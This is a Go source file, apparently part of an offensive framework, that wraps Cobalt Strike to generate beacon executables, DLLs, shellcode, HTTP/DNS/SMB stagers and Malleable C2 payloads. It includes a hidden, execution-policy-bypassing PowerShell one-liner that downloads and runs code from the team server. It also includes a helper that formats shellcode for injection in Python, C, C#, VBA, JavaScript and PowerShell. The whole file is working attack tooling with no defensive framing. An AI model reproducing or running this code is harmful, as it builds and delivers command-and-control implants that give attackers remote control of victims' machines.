package cobaltstrike

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/ares/engine/internal/logger"
)

func (e *CobaltStrikeEngine) GenerateBeaconEXE(listenerName string, arch string) (string, error) {
	if arch == "" {
		arch = "x64"
	}

	cmd := exec.Command("cobaltstrike/artifact.exe",
		"--listener", listenerName,
		"--arch", arch,
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("generate beacon exe: %w\n%s", err, string(output))
	}

	result := fmt.Sprintf("[+] Beacon EXE generated for listener '%s' (%s)\n%s", listenerName, arch, string(output))
	logger.Info("[CobaltStrike] " + result)
	return result, nil
}

func (e *CobaltStrikeEngine) GenerateBeaconDLL(listenerName string, arch string) (string, error) {
	if arch == "" {
		arch = "x64"
	}

	cmd := exec.Command("cobaltstrike/artifact.dll",
		"--listener", listenerName,
		"--arch", arch,
		"--format", "dll",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("generate beacon dll: %w\n%s", err, string(output))
	}

	result := fmt.Sprintf("[+] Beacon DLL generated for listener '%s' (%s)\n%s", listenerName, arch, string(output))
	logger.Info("[CobaltStrike] " + result)
	return result, nil
}

func (e *CobaltStrikeEngine) GenerateBeaconPowerShell(listenerName string) (string, error) {
	script := fmt.Sprintf(
		`powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://%s/a')"`,
		e.config.TeamServerHost,
	)

	if e.restAPIEnabled {
		endpoint := "/api/cs/powershell"
		payload := fmt.Sprintf(`{"listener":"%s"}`, listenerName)
		resp, err := e.restAPICall("POST", endpoint, strings.NewReader(payload))
		if err == nil {
			return resp, nil
		}
	}

	result := fmt.Sprintf("[+] Beacon PowerShell one-liner for '%s':\n%s", listenerName, script)
	logger.Info("[CobaltStrike] " + result)
	return result, nil
}

func (e *CobaltStrikeEngine) GenerateBeaconShellcode(listenerName string, arch string, format string) (string, error) {
	if arch == "" {
		arch = "x64"
	}

	cmd := exec.Command("cobaltstrike/shellcode_generator",
		"--listener", listenerName,
		"--arch", arch,
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("generate shellcode: %w\n%s", err, string(output))
	}

	converted, err := ConvertShellcodeToFormat(output, format)
	if err != nil {
		return string(output), nil
	}

	result := fmt.Sprintf("[+] Beacon shellcode generated for '%s' (%s) [%s]\n%s", listenerName, arch, format, converted)
	logger.Info("[CobaltStrike] " + result)
	return result, nil
}

func (e *CobaltStrikeEngine) GenerateStager(listenerName string, protocol string) (string, error) {
	switch protocol {
	case "http":
		return e.generateStagerHTTP(listenerName)
	case "dns":
		return e.generateStagerDNS(listenerName)
	case "smb":
		return e.generateStagerSMB(listenerName)
	default:
		return "", fmt.Errorf("unsupported stager protocol: %s", protocol)
	}
}

func (e *CobaltStrikeEngine) generateStagerHTTP(listenerName string) (string, error) {
	cmd := exec.Command("cobaltstrike/stager",
		"--listener", listenerName,
		"--protocol", "http",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("generate http stager: %w\n%s", err, string(output))
	}
	result := fmt.Sprintf("[+] HTTP stager for '%s'\n%s", listenerName, string(output))
	return result, nil
}

func (e *CobaltStrikeEngine) generateStagerDNS(listenerName string) (string, error) {
	cmd := exec.Command("cobaltstrike/stager",
		"--listener", listenerName,
		"--protocol", "dns",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("generate dns stager: %w\n%s", err, string(output))
	}
	result := fmt.Sprintf("[+] DNS stager for '%s'\n%s", listenerName, string(output))
	return result, nil
}

func (e *CobaltStrikeEngine) generateStagerSMB(listenerName string) (string, error) {
	cmd := exec.Command("cobaltstrike/stager",
		"--listener", listenerName,
		"--protocol", "smb",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("generate smb stager: %w\n%s", err, string(output))
	}
	result := fmt.Sprintf("[+] SMB stager for '%s'\n%s", listenerName, string(output))
	return result, nil
}

func (e *CobaltStrikeEngine) GeneratePayloadFromProfile(profilePath string) (string, error) {
	_, err := os.ReadFile(profilePath)
	if err != nil {
		return "", fmt.Errorf("read profile: %w", err)
	}

	cmd := exec.Command("cobaltstrike/profile_compiler",
		"--profile", profilePath,
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("compile profile: %w\n%s", err, string(output))
	}

	result := fmt.Sprintf("[+] Payload generated from Malleable C2 profile '%s'\n%s", profilePath, string(output))
	logger.Info("[CobaltStrike] " + result)
	return result, nil
}

func ConvertShellcodeToFormat(shellcode []byte, format string) (string, error) {
	switch strings.ToLower(format) {
	case "python":
		payload := "buf = b\""
		for _, b := range shellcode {
			payload += fmt.Sprintf("\\x%02x", b)
		}
		payload += "\""
		return payload, nil

	case "c#", "csharp":
		payload := "byte[] buf = new byte[] { "
		for i, b := range shellcode {
			if i > 0 {
				payload += ", "
			}
			payload += fmt.Sprintf("0x%02x", b)
		}
		payload += " };"
		return payload, nil

	case "base64":
		return base64.StdEncoding.EncodeToString(shellcode), nil

	case "hex":
		return hex.EncodeToString(shellcode), nil

	case "ruby":
		payload := "shellcode = \""
		for _, b := range shellcode {
			payload += fmt.Sprintf("\\x%02x", b)
		}
		payload += "\""
		return payload, nil

	case "c":
		payload := "unsigned char buf[] = { "
		for i, b := range shellcode {
			if i > 0 {
				payload += ", "
			}
			payload += fmt.Sprintf("0x%02x", b)
		}
		payload += " };"
		return payload, nil

	case "raw":
		return string(shellcode), nil

	case "powershell":
		encoded := base64.StdEncoding.EncodeToString(shellcode)
		return fmt.Sprintf("[Byte[]] $buf = [System.Convert]::FromBase64String('%s')", encoded), nil

	case "javascript":
		payload := "var buf = new Uint8Array(["
		for i, b := range shellcode {
			if i > 0 {
				payload += ","
			}
			payload += fmt.Sprintf("0x%02x", b)
		}
		payload += "]);"
		return payload, nil

	case "vba":
		payload := "Dim buf As Variant\nbuf = Array("
		for i, b := range shellcode {
			if i > 0 {
				payload += ", "
			}
			payload += fmt.Sprintf("&H%02X", b)
		}
		payload += ")"
		return payload, nil

	default:
		return "", fmt.Errorf("unsupported format: %s", format)
	}
}
